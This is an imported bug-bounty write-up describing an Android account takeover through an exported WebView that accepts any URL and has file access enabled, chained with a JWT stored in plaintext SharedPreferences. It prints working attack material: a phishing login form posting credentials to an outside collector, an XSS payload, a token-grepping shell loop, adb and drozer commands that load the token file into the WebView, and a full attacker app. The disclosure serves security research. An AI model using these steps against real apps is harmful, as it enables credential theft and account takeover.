---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-01_how-i-was-able-to-get-account-takeover-via-insecure-data-storage-and-webview-wit_2.md
original_filename: 2023-07-01_how-i-was-able-to-get-account-takeover-via-insecure-data-storage-and-webview-wit_2.md
title: How i was able to get Account Takeover via Insecure Data Storage and WebView
  With Exported Activity
category: documents
detected_topics:
- mobile-security
- jwt
- access-control
- xss
- command-injection
- otp
tags:
- imported
- documents
- mobile-security
- jwt
- access-control
- xss
- command-injection
- otp
language: en
raw_sha256: c640cd48327c29a669b790139cdf51789db05b7821d96311d7fb00ad984b84d3
text_sha256: de5fa2e1dc50781be356d4b81cbbb917d596aa815323520e1e12100a3660971a
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: true
---

# How i was able to get Account Takeover via Insecure Data Storage and WebView With Exported Activity

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-01_how-i-was-able-to-get-account-takeover-via-insecure-data-storage-and-webview-wit_2.md
- Source Type: markdown
- Detected Topics: mobile-security, jwt, access-control, xss, command-injection, otp
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: True
- Raw SHA256: `c640cd48327c29a669b790139cdf51789db05b7821d96311d7fb00ad984b84d3`
- Text SHA256: `de5fa2e1dc50781be356d4b81cbbb917d596aa815323520e1e12100a3660971a`


## Content

---
title: "How i was able to get Account Takeover via Insecure Data Storage and WebView With Exported Activity"
url: "https://medium.com/@M0X0101/how-i-was-able-to-get-account-takeover-via-insecure-data-storage-and-webview-with-exported-activity-5308a330ab80"
authors: ["Mohamed Reda (@M0x0101)"]
bugs: ["Account takeover", "Android", "Webview", "Insecure data storage", "Firebase"]
publication_date: "2023-07-01"
added_date: "2023-07-03"
source: "pentester.land/writeups.json"
original_index: 981
scraped_via: "browseros"
---

# How i was able to get Account Takeover via Insecure Data Storage and WebView With Exported Activity

How i was able to get Account Takeover via Insecure Data Storage and WebView With Exported Activity
Mohamed reda
Follow
8 min read
·
Jul 1, 2023

211

5

Hello guys, today I’m gonna explain how I got Account Takeover via Insecure Data Storage and WebView with Exported Activity.

I started hunting for vulnerabilities on the BBP at PentaBug platform. I had a private one Let’s say it’s name was “redirect”, i will focus on android at this time ;D.

First i will take about my android pentesting methodology and what i actually did to get this vulnerability it was static and dynamic.

I start hunting as normal, get my scope and i found an android app.

So i run my NoxPlayer and install the app from google play and exported it to my PC to make source code analyses with jadx-gui.

Static :

I take a fast look at the manifest file to get some data like package name, exported activity, deep links, broadcast reverses, providers and take not for all of them (you can use drozer at this point as it will be very helpful)

Drozer: is a mobile application security testing framework that allows developers and security professionals to identify and assess potential vulnerabilities in Android apps. It provides a set of tools and modules that can be used to perform various types of security testing, such as dynamic analysis, static analysis, and exploitation. Drozer can be used to test both native and hybrid Android apps and supports various testing techniques, including SSL validation, intent interception, and privilege escalation. It is an open-source tool and can be used on various operating systems, including Windows, Linux, and macOS.

After that i take look at “res/values/strings.xml”, “res/raw/*” and “res/xml/*” as it could has sensitive data.

At “res/values/strings.xml” i found

<string name=“firebase_database_url”> https://it’s_secret_bro.firebaseio.com</string>

To check if it’s exploitable or not just add /.json at the end of the URL.

https://it’s_secret_bro.firebaseio.com/.json but unfortunately i got this error

error"The Firebase database 'it's_secret_bro' has been disabled by a database owner."

So i cant did anything at this point but if you got a response with some data you You can exploit this write-up

After I got back to my notes, i started to focus at exported activity, and i found that it was a WebView.

WebView: Android WebView is a system component provided by the Android operating system that allows developers to display web content within their app. It is a view that can be added to an Android app’s user interface, and it renders web content using the same rendering engine as the Google Chrome browser. WebView enables developers to embed web pages, HTML content, and web-based features into their apps, such as displaying web-based forms or integrating social media features. It also provides various APIs for interacting with the web content, such as JavaScript interfaces and the ability to handle web page navigation. WebView is a powerful tool for creating hybrid mobile apps that combine native and web-based features, and it is widely used in Android app development.

Press enter or click to view image in full size
exported WebView

At this point i go to read the source code to make a good analyses about this WebView, and i found this class

package com.I_said_it's_secret_bro.ui.activities;
import android.content.Intent;
import android.os.Bundle;
import androidx.activity.compose.ComponentActivityKt;
import androidx.compose.runtime.internal.ComposableLambdaKt;
import androidx.compose.runtime.internal.StabilityInferred;
import com.I_said_it's_secret_bro.common.base.LocalizedActivity;
import java.util.LinkedHashMap;
@StabilityInferred(parameters = 0)
/* loaded from: classes4.dex */
public final class MigrateTo_I_said_it's_secret_bro_WebViewActivity extends LocalizedActivity {
  public MigrateTo_I_said_it's_secret_bro_WebViewActivity() {
  new LinkedHashMap();
  }
@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
  public final void onActivityResult(int i, int i2, Intent intent) {
  if (i == 5) {
  new com._I_said_it's_secret_bro_.common.compose.webview.b(this).a(i2, intent);
  }
  }
@Override // com.redirect.common.base.LocalizedActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
  public final void onCreate(Bundle bundle) {
  super.onCreate(bundle);
  ComponentActivityKt.setContent$default(this, null, ComposableLambdaKt.composableLambdaInstance(-1188722403, true, new MigrateTo_I_said_it's_secret_bro_WebViewActivity$onCreate$1(this)), 1, null);
  }
}

So i directly go to “MigrateTo_redirect_WebViewActivity$onCreate$1” by click ctrl+click on it

And i got this code, so let’s start

Press enter or click to view image in full size
extra

The implementation here take a URL as StringExtra so that is our point

StringExtra: A “StringExtra” is a type of extra information that can be passed between Android components, such as activities or services, using an Intent object. It is a key-value pair where the key is a string identifier and the value is a string data. StringExtra is commonly used to pass simple text data, such as a username or password, from one component to another. The receiving component can retrieve the StringExtra value by using the key to access the Intent extras bundle. StringExtra is a part of the Android SDK and is used in Android app development.

So here this code declares a public, final method named S1 that returns a WebView object.

WebView implementation

S1().getSettings().setJavaScriptEnabled(true); - This enables JavaScript in the WebView object returned by the S1() method.

S1().getSettings().setAllowFileAccess(true); - This allows the WebView object to access local files.

Impact:

First we can get ATO with malicious JS form

To make this attack with external JS file
I write HTML file with login form to send the credentials as post methoed use JS

<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Login Form</title>
</head>
<center>
  <body>
  <img src="https://www.redirect.com/_next/static/media/1f4fa971.svg"></br>
  <form method="POST" action="https://webview.free.beeceptor.com/login">
  <label for="email">Email:</label>
  <input type="email" id="email" name="email"><br>
  <label for="password">Password=***REDACTED***
  <input type="password" id="password" name="password"><br>
  <input type="submit" value="Login">
  </form>
  <script src="script.js"></script>
  <script src="https://replit.com/public/js/replit-badge-v2.js" theme="dark" position="bottom-right"></script>
  </body>
</center>
</html>

With ADB to start activity as

adb shell am start -n <package_name>/<fully_qualified_activity_name> -e <extra_key> <extra_value>

So the command will be

adb shell am start -n com.redirect.app/com.redirect.ui.activities.MigrateToredirectWebViewActivity -e MIGRATION_URL_BUNDLE "https://bro_this_is_a_secret.secret.repl.co/"

ADB: (Android Debug Bridge) is a command-line tool that is part of the Android SDK (Software Development Kit). It allows developers and advanced users to communicate with an Android device or emulator over a USB or Wi-Fi connection. ADB provides a set of commands that can be used to interact with an Android device, such as installing or uninstalling apps, transferring files, debugging apps, and accessing the device’s shell. ADB is commonly used for app development, testing, and debugging purposes, but it can also be used for various other tasks, such as rooting an Android device or taking screenshots. ADB is a powerful tool for working with Android devices and is an essential part of the Android development toolkit.

Press enter or click to view image in full size

When user enter the credentials it will send to your server.

Second: XSS
As on the first, make JS with

<script>alert('M0X0101 Hacked YOU!')</script>

in the JS file

Press enter or click to view image in full size

At this point we can get xss and open redirect, but as the implementation enable object to access local files we can try to find file with sensitive content

I go back to NoxPlayer and run the app, and make account and login

Get Mohamed reda’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

After that run the adb to check sharedPreferences to search for any sensitive data

sharedPreferences: is a simple and efficient way to store small amounts of data in key-value pairs in an Android app. It provides a way to store and retrieve primitive data types such as boolean, integer, string, and float values. SharedPreferences is commonly used to store user preferences, settings, or other small amounts of data that need to persist across app sessions.

SharedPreferences are stored in an XML file in the app’s private storage. The data is accessible only to the app that created it and can be accessed using the app’s Context object. When an app needs to read or write data from SharedPreferences, it first obtains a reference to the SharedPreferences object using the app’s Context object and then uses the provided methods to read or write data to the SharedPreferences file.

SharedPreferences are lightweight and easy to use, making them a popular choice for storing small amounts of data in an Android app.

adb shell
cd data/data/com.redirect.app/shared_prefs/
for i in `ls`; do echo $i;cat $i| grep "token";done
Press enter or click to view image in full size

Attack Part:

We have two vulnerabilities so why we don't make a chain?

As we have S1().getSettings().setAllowFileAccess(true);

And insecure data storage (jwt at sheared pref) we can get account takeover

So let’s make the attack with 3 deference ways

First:

Use ADB as we now now the path for the token at the sharedPreferences “data/data/com.redirect.app/shared_prefs/OK_PREF.xml”

So the command will be

adb shell am start -n com.redirect.app/com.redirect.ui.activities.MigrateTo_redirect_WebViewActivity -e MIGRATION_URL_BUNDLE 'file:///data/data/com.redirect.app/shared_prefs/OK_PREF.xml'
Press enter or click to view image in full size

Note: you are now running command as root, so you should check if the activity was exported

Second:

Drozer: as drozer doesn’t has a root permission so we can try with it

run app.activity.start --component <package_name> <fully_qualified_activity_name> --extra <extra_Type> <extra_key> <extra_value>

So the command will be

run app.activity.start --component com.redirect.app com.redirect.ui.activities.MigrateTo_redirect_WebViewActivity --extra string MIGRATION_URL_BUNDLE 'file:///data/data/com.redirect.app/shared_prefs/OK_PREF.xml'
Press enter or click to view image in full size

Third:

Android Studio:

I build an android with android Studio to make the exploit.

So this is the main activity

package com.attcker.exploit_webview;

  import androidx.appcompat.app.AppCompatActivity;
  import android.content.Intent;
  import android.util.Log;
  import android.view.View;
  import android.widget.Button;
  import android.os.Bundle;
  import android.content.ComponentName;
  import android.graphics.Bitmap;
  import android.graphics.Canvas;
  import android.graphics.Rect;
  import android.os.Environment;
  import android.view.ViewGroup;

  import androidx.appcompat.app.AppCompatActivity;

  import java.io.File;
  import java.io.FileOutputStream;
  import java.io.IOException;

  public class MainActivity extends AppCompatActivity {

  @Override
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.activity_main);
  Button mButton = (Button) findViewById(R.id.button);
  mButton.setOnClickListener(new View.OnClickListener() {
  @Override
  public void onClick(View view) {
  Intent launch=new Intent(Intent.ACTION_SEND);
  launch.setClassName("com.redirect.app","com.redirect.ui.activities.MigrateTo_redirect_WebViewActivity");
  launch.putExtra("MIGRATION_URL_BUNDLE", "file:///data/data/com.redirect.app/shared_prefs/OK_PREF.xml");
  startActivity(launch);

  }
  });
  }

After user install that app and run it, i designed a button with name “Hack_Me” so when the victim click on it the exploit will start.

Note: we didn't need the button but i added it as I’m a hacker :D

Triaged
Press enter or click to view image in full size
Rewarded

Report time line

Created — 2 May 2023

Severity changed from Critical to High — June 1 2023

Accepted — June 1 2023

Bounty awarded €€€ — June 12 2023

I will make anther write-up for dynamic part, but you can read this awesome one now

Android App SSL Pinning Bypass [NoxPlayer + nox_adb + Frida + Objection] — English Version
بسم الله الرحمن الرحيم

medium.com

Resources:

https://www.udemy.com/course/the-complete-guide-to-android-bug-bounty-penetration-tests/

Allsafe Android Walkthrough - Part 1
Introduction Allsafe is just another intentionally vulnerable Android application. The app is built with kotlin and…

justahmed.github.io

Android Penetration Testing: WebView Attacks - Hacking Articles
Introduction Initially, there was a time when only HTML used to display web pages. Then came JavaScript and along came…

www.hackingarticles.in

Drozer Tutorial
cybersecurity company? Do you want to see your company advertised in HackTricks? or do you want to have access to the…

book.hacktricks.xyz

Webview Attacks
Don't enable this setting if you open files that may be created or altered by external sources. Enabling this setting…

book.hacktricks.xyz

Exploiting Android WebView Vulnerabilities
What is WebView?

medium.com

Exploiting Android WebView Vulnerabilities
The WebView class, which is an extension of the View class in Android, can be used to show a web page as part of your…

redfoxsec.com

Thank you for reading, and I hope you learned something new! If you have any questions or feedback, please don’t hesitate to DM me on Twitter or LinkedIn.
